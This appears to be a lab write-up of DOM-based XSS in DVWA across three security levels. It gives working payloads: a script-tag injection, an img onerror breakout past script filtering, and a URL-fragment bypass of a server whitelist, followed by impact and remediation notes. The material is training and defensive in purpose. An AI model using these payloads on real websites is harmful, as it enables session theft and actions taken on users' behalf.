# DOM-Based Cross-Site Scripting (DOM XSS)

## Overview

DOM-Based Cross-Site Scripting (DOM XSS) occurs when client-side JavaScript processes user-controlled input and updates the Document Object Model (DOM) without proper sanitization, allowing arbitrary JavaScript execution in the browser.

## Security Level Comparison

| Feature | Low | Medium | High |
|---------|------|---------|------|
| Protection | None | `<script>` tag filtering | Server-side whitelist |
| Bypass Technique | Standard `<script>` | HTML Event (`onerror`) | URL Fragment (`#`) |
| Exploitation Difficulty | Easy | Moderate | Moderate |

> **Note:** If your DVWA version behaves differently, document the observed behavior instead of relying only on the expected challenge behavior.

---

## Low Security Level

### Attack Flow

| Payload | Objective | Result |
|---------|-----------|--------|
| `?default=English` | Verify normal behavior | Page loads normally. |
| `?default=English<script>alert(document.domain)</script>` | Confirm DOM XSS | JavaScript executed successfully. |

### Observation

The application inserts the `default` parameter into the DOM without sanitization, allowing arbitrary JavaScript execution.

### Evidence

### Payload Used

```text
?default=English<script>alert(document.domain)</script>
```

<p align="center">
<img src="https://github.com/Tanya0xCyber/Web-Application-Security-Assessment-DVWA/blob/main/Screenshots/XSS/Dom_xss/01_low_payload.png" width="100%">
</p>

### Successful Execution

<p align="center">
<img src="https://github.com/Tanya0xCyber/Web-Application-Security-Assessment-DVWA/blob/main/Screenshots/XSS/Dom_xss/02_low_result.png" width="100%">
</p>

---

## Medium Security Level

### Attack Flow

| Payload | Objective | Result |
|---------|-----------|--------|
| `?default=English<script>alert(document.domain)</script>` | Verify filtering | Blocked |
| `?default=English><img src=x onerror=alert(document.domain)>` | Test simple HTML injection | Failed *(if applicable)* |
| `?default=English></option></select><img src=x onerror=alert(document.domain)>` | Escape HTML context and trigger `onerror` | JavaScript executed successfully. |

### Observation

Filtering the `<script>` tag alone is insufficient because HTML event handlers remain executable.

### Evidence

### Payload Used

```text
?default=English></option></select><img src=x onerror=alert(document.domain)>
```

<p align="center">
<img src="https://github.com/Tanya0xCyber/Web-Application-Security-Assessment-DVWA/blob/main/Screenshots/XSS/Dom_xss/03_medium_payload.png" width="100%">
</p>

### Successful Execution

<p align="center">
<img src="https://github.com/Tanya0xCyber/Web-Application-Security-Assessment-DVWA/blob/main/Screenshots/XSS/Dom_xss/04_medium_result.png" width="100%">
</p>

---

## High Security Level

### Attack Flow

| Payload | Objective | Result |
|---------|-----------|--------|
| `?default=English<script>alert(document.domain)</script>` | Verify whitelist protection | Blocked |
| `?default=English#<script>alert(document.domain)</script>` | Test URL fragment injection | JavaScript executed successfully. |

### Observation

The server validates the query parameter but does not process the URL fragment (`#`). The client-side JavaScript reads the fragment and updates the DOM, resulting in JavaScript execution.

### Evidence

### Payload Used

```text
?default=English#<script>alert(document.domain)</script>
```

<p align="center">
<img src="https://github.com/Tanya0xCyber/Web-Application-Security-Assessment-DVWA/blob/main/Screenshots/XSS/Dom_xss/05_high_payload.png" width="100%">
</p>

### Successful Execution

<p align="center">
<img src="https://github.com/Tanya0xCyber/Web-Application-Security-Assessment-DVWA/blob/main/Screenshots/XSS/Dom_xss/06_high_result.png" width="100%">
</p>

# Root Cause

Client-side JavaScript updates the DOM using user-controlled input without proper sanitization. Since the vulnerable code executes in the browser, server-side filtering alone cannot prevent DOM XSS.

# Overall Impact

- Execute arbitrary JavaScript in the victim's browser.
- Steal sensitive user information or session identifiers.
- Modify webpage content.
- Redirect users to malicious websites.
- Perform actions on behalf of authenticated users.

# Remediation

- Avoid inserting untrusted data using `innerHTML`.
- Use safe DOM APIs such as `textContent` or `setAttribute()`.
- Validate and sanitize client-side input.
- Implement a strong Content Security Policy (CSP).
- Perform regular client-side security testing.
